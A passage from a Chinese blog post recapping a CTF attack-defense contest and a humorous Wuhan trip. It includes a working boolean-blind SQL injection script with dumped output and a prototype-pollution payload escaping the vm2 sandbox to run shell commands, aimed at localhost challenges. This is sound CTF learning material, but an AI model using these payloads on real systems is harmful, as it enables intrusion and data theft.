</span></span><span class="line"><span class="cl">Q：内联查询注入（inline Query）
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>--tamper</code>: 指定自定义过滤脚本。在本题中，空格被过滤且注释绕过<code>/**/</code>，加号绕过<code>+</code>都不好使。于是我们可以把tamper里自带的<code>space2plus.py</code>中的<code>+</code>都改成<code>\n</code>，就变成了<code>space2newline</code></li>
</ul>
<p>比赛时远程环境有些空格能用%0a绕过有些不行，👴绞尽脑汁用括号绕过，最终耻辱下播。赛后复现的环境里urlencode都不好使了，最后想到直接全部用换行符<code>\n</code>即可。</p>
<p>参考链接：</p>
<ul>
<li><a class="link" href="https://sqlmap.highlight.ink/"  target="_blank" rel="noopener"
    >sqlmap中文手册</a></li>
</ul>
<!-- 
```py
import requests
import string

flag_char = string.ascii_letters + string.digits + string.punctuation

#### 自定义参数：题目环境
# 目标url
url = "http://localhost/search.php"
# 成功响应的特征字符串
success_pat="images/image1.jpg"
# 定义请求格式
def req(url, payload):
    r = requests.post(url, data={'search_query': payload})
    return r.text


# 布尔盲注：数量
def bool_inject_len(payload, r=40, pat=success_pat):
    for i in range(1, r):
        p = payload.format(num=i)
        if pat in req(url, p):
            # print(i)
            return i
    return 0

# 布尔盲注：字符
def bool_inject_str(payload, r=40, pat=success_pat):
    ans = ""
    for i in range(1, r+1):
        f = True
        for j in flag_char:
            p = payload.format(index=i, char=j)
            res = req(url, p)
            # print(p,res)
            if pat in res:
                ans += j
                # print(ans)
                f = False
                break
        if f: break
    return ans

# 使用布尔盲注，先查询数量再逐个爆破
def bool_inject(sub, param):
    c_query = count_query.format(sub_query=sub, num="{num}")
    # print(c_query)
    count = bool_inject_len(c_query)
    # print("数量：",count)
    result_list = []
    for i in range(0, count):
        d_query = data_query.format(column=param,sub_query=sub, num=i,index="{index}", char="{char}")
        # print(d_query)
        result_list.append(bool_inject_str(d_query))
    return result_list

#### 自定义参数：query模板
# 使用回车换行符和()来绕过空格过滤
# 数量查询
count_query = "1'And(Select(COUNT(*))From({sub_query}))='{num}"
# 爆破字符
data_query = """1'And(Select(substr({column},{index},1))From({sub_query})limit
{num},1)='{char}"""

#### 自定义参数：子查询
# 库
p_db_c = "1'And(Select(substr(database(),{index},1)))='{char}"
db = bool_inject_str(p_db_c)
print("[+]数据库: ", db)
# 表
p_tb_l = "infOrmation_schema.tables)where(table_schema='%s'" % db # 拼接where子句
tb_list = bool_inject(p_tb_l, "table_name")
print("[*]表: ", tb_list)
for tb in tb_list: 
    # 列
    p_co_l = "infOrmation_schema.columns)where(table_name='%s'" % tb
    co_list = bool_inject(p_co_l, "column_name")
    print("    [+]表:", tb, "\n       列：",co_list)
    for co in co_list: 
        # 值
        p_da_l = tb
        da_list = bool_inject(p_da_l, co)
        print("      [+]列:", co, "\n         值：", da_list)
```

输出belike：

```sql
[+]数据库:  ctf
[*]表:  ['images', 'nmsl']
    [+]表: images
       列： ['id', 'image_path']
      [+]列: id
         值： ['1', '2', '3', '4']
      [+]列: image_path
         值： ['images/image1.jpg', 'images/image2.jpg', 'images/image3.jpg', 'images/image4.jpg']
    [+]表: nmsl
       列： ['flag']
      [+]列: flag
         值： ['flag{nmsl}']
``` 
-->
<h4 id="web3">Web3</h4>
<p>考一nodejs，没源码啥也看不出来。其实直接跟文件名就能读源码，但是上午👴忘了,血亏x5。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">,</span> <span class="nx">VMScript</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm2&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VM</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">backdoor</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VMScript</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">door</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="k">new</span> <span class="nx">VM</span><span class="p">()).</span><span class="nx">run</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">isObject</span> <span class="o">=</span> <span class="nx">obj</span> <span class="p">=&gt;</span> <span class="nx">obj</span> <span class="o">&amp;&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">constructor</span> <span class="o">&amp;&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">constructor</span> <span class="o">===</span> <span class="nb">Object</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">merge</span> <span class="o">=</span> <span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">attr</span> <span class="k">in</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isObject</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="nx">attr</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isObject</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="nx">attr</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">merge</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="nx">attr</span><span class="p">],</span> <span class="nx">b</span><span class="p">[</span><span class="nx">attr</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">a</span><span class="p">[</span><span class="nx">attr</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">attr</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">a</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">clone</span> <span class="o">=</span> <span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">merge</span><span class="p">({},</span> <span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">content</span><span class="o">:</span> <span class="s1">&#39;wwwwwwwwwrong method!!!&#39;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">copybody</span> <span class="o">=</span> <span class="nx">clone</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">copybody</span><span class="p">.</span><span class="nx">back</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">backdoor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">          <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">content</span><span class="o">:</span> <span class="s1">&#39;wwwwwwwwwwwwwhat are you doing???&#39;</span> <span class="o">+</span> <span class="nx">a</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="nx">a</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">content</span><span class="o">:</span> <span class="s1">&#39;wwwwwwwwwwwwwhat are you doing???&#39;</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">content</span><span class="o">:</span> <span class="s2">&#34;i don&#39;t think you are right&#34;</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>👴直接扬backdoor，然后就宕了，发一公告说不让删backdoor，只能加固。我只能说你这种Fix确实有点素质。</p>
<p>然后修也简单，加个waf防一下node题常见的payload关键字即可：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">backdoor</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VMScript</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">door</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">door</span><span class="p">.</span><span class="nx">search</span><span class="p">(</span><span class="sr">/construtcor|exec/</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="k">new</span> <span class="nx">VM</span><span class="p">()).</span><span class="nx">run</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这道题不是很亏，就是有点亏。也不是特别亏，总之还是挺亏的。下午fix的时候离线资料里查到了相关题型，也不是很复杂，👴属于是残疾人复健。</p>
<p>赛后WP：首先用原型链污染拿到<code>Object.door</code>，然后套vm2的沙箱逃逸payload即可：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/back</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost:3000</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">229</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;back&#34;</span><span class="p">:</span> <span class="s2">&#34;nmsl&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;door&#34;</span><span class="p">:</span> <span class="s2">&#34;\nlet res = import(&#39;./foo.js&#39;);\nres.toString.constructor(\&#34;return this\&#34;)().process.mainModule.require(\&#34;child_process\&#34;).execSync(\&#34;whoami\&#34;).toString();\n&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>参考链接：<a class="link" href="https://xz.aliyun.com/t/11859#toc-8"  target="_blank" rel="noopener"
    >CVE-2021-23449</a>。漏洞适用版本：<code>vm2@3.9.3</code></p>
<h4 id="web4">Web4</h4>
<p>给一jar包，虽然👴夜里的智慧装了java逆向的环境。但是看了看代码没啥业务逻辑，应该是框架的洞，👴不会，长大后再来学吧。</p>
<p>赛后看，👴猜有可能是这个洞：<a class="link" href="https://zhuanlan.zhihu.com/p/668635285"  target="_blank" rel="noopener"
    >jeecg-boot/积木报表的Freemarker的SSTI任意代码执行</a></p>
<hr>
<h3 id="决赛战报">决赛战报</h3>
<p>上午刚结束一分钟，👴队友出一个逆向，属于是典中典，血亏x6。上午排名20多，下午fix亏了300分左右。最后👴队第17名。本科生队更是寄中寄，建议立刻招开批斗大会，狠狠的唠一辈子。</p>
<p>下午结束后主办方问前20的要录屏，👴寻思应该能拿一奖状吧。于是提前开香槟，好歹没空手回去。于是高高兴兴到了颁奖典礼，还看一表演呢。</p>
<p><img src="/p/chb2023/16.png"
	width="824"
	height="943"
	srcset="/p/chb2023/16_hu5ba21e4117753760ed472d3d3d5b8c04_758698_480x0_resize_box_3.png 480w, /p/chb2023/16_hu5ba21e4117753760ed472d3d3d5b8c04_758698_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="1 &#43; 3 &#43; 5 &#43; 7 = 16"
	
	
		class="gallery-image" 
		data-flex-grow="87"
		data-flex-basis="209px"
	
></p>
<p>👴掐指一算，<code>1 + 3 + 5 + 7 = 16 &lt; 17</code>。嘶——这该死的宿命感。</p>
<p><img src="/p/chb2023/ya.gif"
	width="300"
	height="300"
	srcset="/p/chb2023/ya_hu70888f37f3a52218d1fc43488aabbee3_484413_480x0_resize_box_1.gif 480w, /p/chb2023/ya_hu70888f37f3a52218d1fc43488aabbee3_484413_1024x0_resize_box_1.gif 1024w"
	loading="lazy"
	
		alt="(╯‵□′)╯︵┻━┻"
	
	
		class="gallery-image" 
		data-flex-grow="100"
		data-flex-basis="240px"
	
></p>
<blockquote>
<p>贵🐋的诅咒：</p>
<ul>
<li>比赛结束之后一分钟出flag</li>
<li>半场开香槟然后差一名拿奖</li>
</ul>
</blockquote>
<h2 id="有捞无堂">有捞无堂</h2>
<blockquote>
<p>释义：有奖金海底捞，没奖金滚回去吃食堂。</p>
</blockquote>
<p>其实就算👴们把亏了的题都补上也够呛能进前9。所以也不是很亏，就是有点晦气。</p>
<p><img src="/p/chb2023/ai.gif"
	width="300"
	height="300"
	srcset="/p/chb2023/ai_hu9fe73538f0ba708cfa56e09ef2ec10cd_960839_480x0_resize_box_1.gif 480w, /p/chb2023/ai_hu9fe73538f0ba708cfa56e09ef2ec10cd_960839_1024x0_resize_box_1.gif 1024w"
	loading="lazy"
	
		alt="事已至此，先吃饭吧"
	
	
		class="gallery-image" 
		data-flex-grow="100"
		data-flex-basis="240px"
	
></p>
<p>总之，比完赛了还是要考虑办正事——旅游。这次来武汉可是除晦之行，绝对不能让比赛的晦气留给第二天。</p>
<h3 id="除晦未半而中道崩殂">除晦未半而中道崩殂</h3>
<blockquote>
<ul>
<li>👴：揍！</li>
<li>队友A：鼻子堵着了很吉尔难受</li>
<li>队友B：👴要去见朋友</li>
</ul>
</blockquote>
<p>坏了，晦起来了。都怪去颁奖典礼的时候没穿外套给冻着了。👴去问隔壁队：</p>
<blockquote>
<ul>
<li>冰糖雪狸：👴队友也烧起来了</li>
<li>👴：？活着</li>
</ul>
</blockquote>
<p>什么嘛，这不是什么也没除掉吗(😎→🕶️🤏😭)</p>
<p>安顿好病人，最终只有👴和<strong>冰糖雪狸</strong>俩人去市里约会。到了地方一看，你找的这是什么地方？？</p>
<!-- ![荟](huiju.jpg) -->
<p><img src="/p/chb2023/hui.png"
	width="653"
	height="409"
	srcset="/p/chb2023/hui_hucb75ab8aa3325c15166d4b5e144a4cc1_341011_480x0_resize_box_3.png 480w, /p/chb2023/hui_hucb75ab8aa3325c15166d4b5e144a4cc1_341011_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="荟聚"
	
	
		class="gallery-image" 
		data-flex-grow="159"
		data-flex-basis="383px"
	
></p>
<p>但是武汉确实大城市。👴们终于吃了顿好的，俩人买4杯茶颜悦色还都tm喝完了。</p>
<blockquote>
<ul>
<li>👴：这糖水怎么没味啊？</li>
<li>冰糖雪狸：你就是山猪吃不了细糠</li>
<li>👴：确实</li>
</ul>
</blockquote>
<p>吃饱喝足，去江边看看黄鹤楼吧。于是👴们打车去了江滩。太美丽了长江，还是看看远处的黄鹤楼吧。我楼呢？</p>
<p><img src="/p/chb2023/changjiang.jpg"
	width="1280"
	height="960"
	srcset="/p/chb2023/changjiang_hu94b41831c34d19e28be8e3bb9266505e_451644_480x0_resize_q75_box.jpg 480w, /p/chb2023/changjiang_hu94b41831c34d19e28be8e3bb9266505e_451644_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="司机师傅：愚蠢的外地人"
	
	
		class="gallery-image" 
		data-flex-grow="133"
		data-flex-basis="320px"
	
></p>
<p>好容易来一趟看不着亏了。于是👴们打车去了黄鹤楼。你吗过个江20块钱，血亏。</p>
<p><img src="/p/chb2023/huanghelou.jpg"
	width="960"
	height="1280"
	srcset="/p/chb2023/huanghelou_huf471734e97d495fed4ef96b9a3ad8433_513339_480x0_resize_q75_box.jpg 480w, /p/chb2023/huanghelou_huf471734e97d495fed4ef96b9a3ad8433_513339_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="司机师傅：感谢大自然的馈赠"
	
	
		class="gallery-image" 
		data-flex-grow="75"
		data-flex-basis="180px"
	
></p>
<p>最后到了黄鹤楼底下正好关门，寄。</p>
<p>👴突然意识到，这是不是象征着👴队比赛差一名没拿到奖。连起来了。</p>
<h2 id="除晦辩证法">除晦辩证法</h2>
<p>回来的🛫上，👴开始细数这一趟武汉之行的晦气。</p>
<blockquote>
<p>我翻开参赛手册一查，这比赛食宿自理，整整齐齐的每页上都写着“楚慧杯”几个字。我横竖睡不着，仔细看了半夜，才从字缝里看出字来，满本都写着一个字是“晦”！</p>
</blockquote>
<ul>
<li>这比赛名字就沾点晦</li>
<li>以为去捡钱实际上鸡毛没赚着，此为第二晦</li>
<li>差一名拿奖状，此为第三晦</li>
<li>比完赛队友躺了俩，此为第四晦</li>
<li>晚上吃饭的地方也沾点晦</li>
<li>去黄鹤楼刚好关门，此为第六晦</li>
</ul>
<p>贵🐋著名哲学家Aidaip在其著作<a class="link" href="https://aidaip.github.io/life/2022/06/01/%E4%BA%8F%E6%99%A6%E4%BA%8C%E8%B1%A1%E6%80%A7.html"  target="_blank" rel="noopener"
    >《亏晦二象性》</a>$^{[1]}$中阐释了晦气的基本原理：</p>
<blockquote>
<p>亏了，却想着赚了，终于晦气。——Aidaip</p>
</blockquote>
<p>这一原理后经学者整理成如下的形式化描述：</p>
<p>$$
亏 \xrightarrow{\textit{想赚}} 晦
$$</p>
<p>本科👴真的为了打比赛去的，所以他们亏了，让人唠一辈子。为什么亏了，还是因为菜。菜就多练。</p>
<p>👴为了除晦而彳亍，此时还没有亏。也没有想赚，但还是晦气。
说明目前的主流理论不足以解释新的实验现象。</p>
<p>如果👴能把题都秒了，👴们就不会注意到其他的晦气。为什么👴不能秒了，因为👴太菜了。为什么👴太菜了，因为晦气。
但也正因为晦气，👴才会想除晦。</p>
<p>所以得出结论，越晦气，越晦气。</p>
<p>👴一抬头，大师我悟了，原来hui一直在我们身边。他真hui了吗，如hui。</p>
<p><img src="/p/chb2023/shouhui.jpg"
	width="1706"
	height="1280"
	srcset="/p/chb2023/shouhui_hu50b6549d70bcf235f2d8e09377910550_431740_480x0_resize_q75_box.jpg 480w, /p/chb2023/shouhui_hu50b6549d70bcf235f2d8e09377910550_431740_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="从守晦开始"
	
	
		class="gallery-image" 
		data-flex-grow="133"
		data-flex-basis="319px"
	
></p>
<p>给带🔥送上新年祝福：</p>
<ul>
<li>2024希望带🔥都能远离晦气</li>
</ul>
<h3 id="参考文献">参考文献</h3>
<p>[1] AiDaip. 亏晦二象性[EB/OL]. 2022. <a class="link" href="https://aidaip.github.io/life/2022/06/01/%E4%BA%8F%E6%99%A6%E4%BA%8C%E8%B1%A1%E6%80%A7.html"  target="_blank" rel="noopener"
    >https://aidaip.github.io/life/2022/06/01/%E4%BA%8F%E6%99%A6%E4%BA%8C%E8%B1%A1%E6%80%A7.html</a></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ctf/">CTF</a>
        
            <a href="/tags/awdp/">AWDp</a>
        
            <a href="/tags/life/">Life</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            Last updated on Dec 24, 2023 00:00 UTC
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>
    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/ciscn2021%E5%8D%8E%E4%B8%9C%E7%99%BE%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bawd%E5%A4%8D%E7%9B%98/">
        
        
            <div class="article-image">
                <img src="/p/ciscn2021%E5%8D%8E%E4%B8%9C%E7%99%BE%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bawd%E5%A4%8D%E7%9B%98/awd-da-pian.6be30a3509b582a8e70213a0cb82738a_hub2213acc3516fead069948e4c2b6c9af_78570_250x150_fill_q75_box_smart1.jfif" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post CISCN2021华东百赛区分区选拔赛AWD复盘"
                        
                        data-hash="md5-a&#43;MKNQm1gqjnAhOgy4Jzig==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CISCN2021华东百赛区分区选拔赛AWD复盘</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="lonelyuan/giscus-comment"
    data-repo-id="R_kgDOK1hIpw"
    data-category="Announcements"
    data-category-id="DIC_kwDOK1hIp84Cbey0"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
